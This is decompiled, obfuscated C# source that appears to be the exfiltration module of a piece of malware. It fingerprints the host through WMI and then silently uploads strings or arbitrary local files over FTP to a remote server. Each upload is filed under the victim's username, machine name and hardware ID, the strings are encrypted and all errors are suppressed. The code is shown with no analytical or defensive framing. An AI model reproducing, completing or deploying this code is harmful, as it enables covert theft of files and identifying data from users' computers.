using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace jtAYXTgtXeY;

internal sealed class boHoxxDHHXchTbg
{
	[NonSerialized]
	internal static GetString getString_0;

	public static string wdLdkHIHAypDJRkz()
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0040: Expected O, but got Unknown
		//IL_00a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		string text = string.Empty;
		try
		{
			ManagementClass val = new ManagementClass(getString_0(107401917));
			ManagementObjectCollection instances = val.GetInstances();
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				if (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					text = ((ManagementBaseObject)val2).get_Properties().get_Item(getString_0(107401896)).get_Value()
						.ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			string text2 = getString_0(107401847);
			ManagementObject val3 = new ManagementObject(getString_0(107401842) + text2 + getString_0(107401833));
			val3.Get();
			return ((ManagementBaseObject)val3).get_Item(getString_0(107401828)).ToString();
		}
		catch (Exception)
		{
			return string.IsNullOrEmpty(text) ? getString_0(107388183) : text;
		}
	}

	public static void pCegEhjfTlJx(string eQzJkMzmweHjVq = "URL", string oNOwwMVoXrkBL = "USERNAME", string TTTAXgOtbNE = "ACCESO", string eVIIFbEROGfWc = "")
	{
		try
		{
			string text = wdLdkHIHAypDJRkz();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(eQzJkMzmweHjVq + getString_0(107402484) + Environment.UserName + getString_0(107402503) + Environment.MachineName + getString_0(107402450) + text + getString_0(107402445));
			ftpWebRequest.Method = getString_0(107401771);
			ftpWebRequest.Credentials = new NetworkCredential(oNOwwMVoXrkBL, TTTAXgOtbNE);
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			byte[] bytes = aSCIIEncoding.GetBytes(eVIIFbEROGfWc);
			ftpWebRequest.ContentLength = bytes.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(bytes, 0, bytes.Length);
		}
		catch
		{
		}
	}

	public static void QZMptOJxrqEOUZv(string DTkbqVDpwtpA = "URL", string YRRtuOuIFoxjHX = "USERNAME", string kPWjsBvrSJLcU = "ACCESO", string fvQmYXjAWGjC = "")
	{
		try
		{
			string text = wdLdkHIHAypDJRkz();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(DTkbqVDpwtpA + getString_0(107402484) + Environment.UserName + getString_0(107402503) + Environment.MachineName + getString_0(107402450) + text + getString_0(107402450) + Path.GetFileName(fvQmYXjAWGjC));
			ftpWebRequest.Method = getString_0(107401771);
			ftpWebRequest.Credentials = new NetworkCredential(YRRtuOuIFoxjHX, kPWjsBvrSJLcU);
			byte[] array = File.ReadAllBytes(fvQmYXjAWGjC);
			ftpWebRequest.ContentLength = array.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(array, 0, array.Length);
		}
		catch
		{
		}
	}

	static boHoxxDHHXchTbg()
	{
		Strings.CreateGetStringDelegate(typeof(boHoxxDHHXchTbg));
	}
}
